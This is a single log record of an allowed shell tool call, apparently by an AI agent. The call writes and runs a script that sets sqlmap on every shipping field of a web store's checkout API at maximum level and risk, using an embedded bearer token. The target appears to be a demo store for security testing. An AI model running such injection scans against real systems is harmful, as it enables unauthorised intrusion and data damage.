{"ts": 1790654247.7165368, "decision_id": "1030802bd09c", "tool": "run_shell", "allow": true, "reason": null, "target": "cat > /tmp/checkout_test.sh << 'SCRIPT'\n#!/bin/bash\n# Test SQLi on checkout endpoint - test each shipping field\n\nTOKEN=\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTAxYWE4MzUtNGFhZS00NjZlLThkMzgtMGI5ZWMzMWQzYzQwIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcl9uZXcxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NTU3ODB9.FCT2WIH2uRX1MRloaTpqdeYBFY2Tdy_QTNODFXk2Z_w\"\n\n# First, add item to cart\ncurl -s -X POST \"https://duck-store.escape.tech/api/v1/cart/add\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d '{\"product_id\":1,\"quantity\":1}' > /dev/null\n\n# Test each field with sqlmap\nfor field in first_name last_name address city country zip_code; do\n  echo \"Testing $field...\"\n  cat > /tmp/test_${field}.txt <<EOF\nPOST /api/v1/orders/checkout HTTP/1.1\nHost: duck-store.escape.tech\nUser-Agent: sqlmap\nAccept: */*\nContent-Type: application/json\nAuthorization: Bearer $TOKEN\nContent-Length: 130\n\n{\"shipping\":{\"first_name\":\"Test\",\"last_name\":\"User\",\"address\":\"123 Test St\",\"city\":\"Test City\",\"country\":\"US\",\"zip_code\":\"12345\"}}\nEOF\n  sqlmap -r /tmp/test_${field}.txt -p \"$field\" --batch --smart --level=5 --risk=3 --technique=BEUSTQ 2>&1 | tail -30\ndone\nSCRIPT\nchmod +x /tmp/checkout_test.sh\n/tmp/checkout_test.sh 2>&1 | tail -200"}
